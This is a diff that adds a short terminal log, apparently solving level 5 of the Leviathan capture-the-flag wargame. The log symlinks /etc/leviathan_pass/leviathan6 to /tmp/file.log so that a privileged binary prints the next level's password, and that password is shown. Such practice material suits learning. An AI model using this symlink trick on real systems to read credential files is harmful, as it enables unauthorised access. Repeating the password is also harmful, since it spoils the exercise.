@@ -1,0 +1,4 @@
+leviathan5@gibson:~$ ln -sf /etc/leviathan_pass/leviathan6 /tmp/file.log
+leviathan5@gibson:~$ ./leviathan5
+YZ55XPVk2l
+
